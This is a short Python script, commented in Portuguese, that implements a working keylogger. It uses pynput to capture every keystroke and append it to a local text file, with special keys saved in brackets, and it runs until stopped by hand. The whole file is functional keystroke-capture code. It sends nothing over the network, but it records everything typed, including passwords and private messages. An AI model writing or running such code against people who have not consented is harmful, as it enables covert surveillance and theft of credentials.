# Import da biblioteca que vai "escutar" o teclado
from pynput import keyboard

# Nome do arquivo onde as teclas serão gravadas
teclas = "teclas_pressionadas.txt"

# Toda vez que uma tecla for pressionada
def ao_pressionar(tecla):
    try:
        with open(teclas, "a") as arquivo:
            arquivo.write(f"{tecla.char}")
    except AttributeError:
# Se for uma tecla especial salvara com colchetes
         with open(teclas, "a") as arquivo:
            arquivo.write(f"[{tecla}]")

# Inicia o "ouvinte" de teclas
with keyboard.Listener(on_press=ao_pressionar) as registro:
    registro.join()
    
# O programa ficará rodando até ser interrompido manualmente
